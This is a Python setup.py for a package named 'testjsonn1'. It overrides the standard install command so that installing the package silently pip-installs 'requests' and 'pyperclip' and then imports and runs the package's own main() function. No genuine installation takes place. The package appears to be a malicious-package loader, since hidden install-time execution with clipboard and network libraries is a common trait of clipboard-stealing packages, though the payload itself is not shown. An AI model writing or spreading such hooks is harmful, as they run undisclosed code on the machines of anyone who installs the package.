from setuptools import setup, Command
import os

class CustomCommand(Command):
    description = 'Run custom function during installation'
    user_options = []
    

    def initialize_options(self):
        pass

    def finalize_options(self):
        pass

    def run(self):
        import subprocess
        import sys
        # Import your function and run it
        def install_library(library_name):
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", library_name])
                print(f"'{library_name}' has been installed successfully.")
            except subprocess.CalledProcessError as e:
                print(f"An error occurred while trying to install '{library_name}': {e}")
        install_library('requests')
        install_library('pyperclip')
        from testjsonn1 import main
        main()

setup(
    name='testjsonn1',
    version='0.4',
    packages=['testjsonn1'],
    cmdclass={
        'install': CustomCommand,
    },
)
